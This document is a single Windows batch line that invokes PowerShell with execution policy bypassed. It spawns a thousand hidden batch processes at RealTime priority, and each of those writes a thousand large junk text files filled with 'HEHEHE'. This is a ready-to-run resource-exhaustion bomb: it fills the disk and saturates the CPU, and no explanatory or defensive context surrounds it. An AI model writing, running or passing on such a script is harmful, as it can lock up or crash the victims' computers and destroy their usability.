@powershell -Noexit -NoProfile -ExecutionPolicy bypass -Command for ($i = 0; $i -le 1000; $i++) { new-item txt${i}.bat; Set-Content txt${i}.bat 'powershell -Command for ($j = 0; $j -le 1000; $j++) { new-item %%0${j}.txt; Set-Content %%0${j}.txt (''HEHEHE'' * 1000)}'; $process = Start-Process cmd.exe -ArgumentList "/c", "txt${i}.bat" -Windowstyle hidden; $process.PriorityClass='RealTime'; $process.Affinity=255; }
